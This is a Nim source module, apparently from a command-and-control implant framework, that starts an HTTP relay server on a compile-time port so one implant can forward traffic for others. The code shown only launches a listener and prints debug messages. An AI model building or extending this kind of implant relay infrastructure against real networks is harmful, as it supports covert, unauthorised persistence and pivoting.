#[
    HTTP Relay Server Launcher
    Starts the HTTP relay server if RELAY_PORT is defined at compile time
]#

import asyncdispatch
import http_relay

# Check if RELAY_PORT is defined at compile time
const RELAY_PORT {.intdefine.}: int = 0

# Global flag to prevent duplicate starts
var g_relayServerStarted: bool = false

# Start HTTP relay server in async mode (idempotent)
proc startRelayServerAsync*(implantGuid: string) {.async.} =
    when RELAY_PORT > 0:
        # Idempotent guard: return early if already started
        if g_relayServerStarted:
            when defined debug:
                echo "[RELAY] ℹ️  Relay server already started, skipping duplicate start"
            return
        when defined debug:
            echo "[RELAY] 🚀 HTTP Relay server configured on port " & $RELAY_PORT
            echo "[RELAY] 🆔 Using implant GUID: " & implantGuid
        
        # Start relay server in background (non-blocking)
        try:
            let server = startHttpRelayServer(RELAY_PORT, implantGuid)
            
            if server.isListening:
                g_relayServerStarted = true  # Mark as started
                when defined debug:
                    echo "[RELAY] ✅ HTTP Relay server running on port " & $RELAY_PORT
            else:
                when defined debug:
                    echo "[RELAY] ❌ Failed to start HTTP Relay server"
                    
        except Exception as e:
            when defined debug:
                echo "[RELAY] ❌ Exception starting relay server: " & e.msg
    else:
        when defined debug:
            echo "[RELAY] ℹ️  No relay server configured (RELAY_PORT not defined)"

# Check if this implant should act as relay server
proc isRelayServer*(): bool =
    when RELAY_PORT > 0:
        return true
    else:
        return false

# Get the relay server port (0 if not configured)
proc getRelayServerPort*(): int =
    when RELAY_PORT > 0:
        return RELAY_PORT
    else:
        return 0
